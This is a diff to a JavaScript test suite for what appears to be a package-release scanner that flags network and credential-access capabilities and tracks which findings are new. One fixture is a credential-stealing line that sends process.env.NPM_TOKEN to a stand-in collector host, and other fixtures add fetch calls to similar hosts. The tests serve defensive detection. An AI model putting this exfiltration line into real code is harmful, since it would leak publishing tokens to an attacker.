@@ -23,17 +23,27 @@ describe("changed staged line numbers", () => {
     expect([...changedStagedLines(previous, staged)]).toEqual(expected);
   });
 
-  test("past the diff budget, lines whose text occurs more often count as changed", () => {
+  test("past the per-file bound, new text and lines with new neighbours count as changed", () => {
     const previous = Array.from({ length: 40_000 }, (_, index) => `line ${index}`);
-    // Reversed: no line is new, but the move needs far more edits than the budget.
-    const staged = [...previous].reverse();
-    staged.splice(10, 0, "line new");
-    staged.splice(20, 0, "line 7");
+    // Blocks of 100 lines in reverse order: far past the edit bound, but every
+    // line inside a block keeps its neighbours.
+    const staged = [];
+    for (let block = 399; block >= 0; block -= 1) {
+      staged.push(...previous.slice(block * 100, block * 100 + 100));
+    }
+    staged.splice(staged.indexOf("line 39950"), 0, "line new");
+    // Moved alone into another block.
+    staged.splice(staged.indexOf("line 50"), 1);
+    staged.splice(staged.indexOf("line 39920") + 1, 0, "line 50");
     const started = performance.now();
     const changed = changedStagedLines(previous.join("\n"), staged.join("\n"));
     expect(performance.now() - started).toBeLessThan(5_000);
-    const copiesOf7 = staged.flatMap((line, index) => (line === "line 7" ? [index + 1] : []));
-    expect([...changed].sort((a, b) => a - b)).toEqual([11, ...copiesOf7].sort((a, b) => a - b));
+    const at = (line) => staged.indexOf(line) + 1;
+    expect(changed.has(at("line new")) && changed.has(at("line 50"))).toBe(true);
+    // Its old and new neighbours, and block edges, count; block interiors do not.
+    expect(changed.has(at("line 49")) && changed.has(at("line 39949"))).toBe(true);
+    expect(changed.has(at("line 39960")) || changed.has(at("line 20030"))).toBe(false);
+    expect(changed.size).toBeLessThan(1_000);
   });
 });
 
@@ -72,8 +82,12 @@ describe("release-delta annotation stays bounded", () => {
     ["adds a fetch line", 'fetch("https://collect.example.invalid/b");', true],
   ])("a rebuilt bundle past the diff budget that %s", (_label, added, releaseDelta) => {
     const lines = Array.from({ length: 30_000 }, (_, index) => `const v${index} = ${index};`);
-    lines.splice(15_000, 0, 'fetch("https://collect.example.invalid/a");');
-    const rebuilt = [...lines].reverse();
+    lines.splice(15_020, 0, 'fetch("https://collect.example.invalid/a");');
+    // Modules in reverse order, as a bundler rebuild may emit them.
+    const rebuilt = [];
+    for (let start = lines.length - (lines.length % 50 || 50); start >= 0; start -= 50) {
+      rebuilt.push(...lines.slice(start, start + 50));
+    }
     if (added) rebuilt.splice(100, 0, added);
     const previous = [
       { path: "dist/bundle.js", size: 1, sha256: "p", flags: [], textSample: lines.join("\n") },
@@ -631,6 +645,64 @@ describe("release delta in minified and grown modules", () => {
   // The version string sits far more than the match margin from any capability.
   const bundle = (version, tail = "") =>
     `function g(){return fetch("https://api.example.org/v1")};var e=process.env.SERVICE_KEY;var q=${"0".repeat(3000)};var v="${version}";${"1".repeat(3000)}${tail}\n`;
+
+  const STEAL =
+    "require('https').get('https://collector.example.invalid/?t=' + process.env.NPM_TOKEN);";
+  // 23 lines; the credential line moves from a never-called function to the top.
+  const zModule = (reachable) => {
+    const lines = Array.from({ length: 20 }, (_, index) => `exports.f${index} = ${index};`);
+    if (reachable) lines.unshift(STEAL, "function unused() {", "}");
+    else lines.push("function unused() {", STEAL, "}");
+    return `${lines.join("\n")}\n`;
+  };
+  // Distinct lines in a different order each version: the line diff gives up.
+  const shuffled = (count, seed, prefix) => {
+    const lines = Array.from(
+      { length: count },
+      (_, index) => `exports.${prefix}${index} = ${index};`,
+    );
+    let state = seed;
+    for (let index = lines.length - 1; index > 0; index -= 1) {
+      state = (state * 1_103_515_245 + 12_345) % 2_147_483_648;
+      const other = state % (index + 1);
+      [lines[index], lines[other]] = [lines[other], lines[index]];
+    }
+    return `${lines.join("\n")}\n`;
+  };
+
+  test("modified decoy files cannot spend another file's diff budget", () => {
+    const previous = {};
+    const staged = {};
+    for (let index = 0; index < 6; index += 1) {
+      // A finding makes annotation diff the decoy.
+      const decoy = (seed) =>
+        `fetch("https://api.example.org/d");\n${shuffled(2_300, seed, `d${index}_`)}`;
+      previous[`decoy-${index}.js`] = decoy(index + 1);
+      staged[`decoy-${index}.js`] = decoy(index + 101);
+    }
+    previous["z.js"] = zModule(false);
+    staged["z.js"] = zModule(true);
+    const { annotated, risk } = release(previous, staged);
+
+    expect(
+      annotated.find(
+        (finding) => finding.file === "z.js" && finding.ruleId === "code.credential-access",
+      ),
+    ).toMatchObject({ releaseDelta: true });
+    expect(risk.releaseRisk).toBe("high");
+  });
+
+  test("a line moved within a file past the diff bound counts as changed", () => {
+    const filler = (seed) => shuffled(2_500, seed, "s");
+    const previous = { "z.js": `${filler(1)}${zModule(false)}` };
+    const staged = { "z.js": `${filler(2)}${zModule(true)}` };
+    const { annotated, risk } = release(previous, staged);
+
+    expect(annotated.find((finding) => finding.ruleId === "code.credential-access")).toMatchObject({
+      releaseDelta: true,
+    });
+    expect(risk.releaseRisk).toBe("high");
+  });
 
   test("a version-string edit in a minified bundle leaves its capabilities as package context", () => {
     const { annotated, risk } = release(
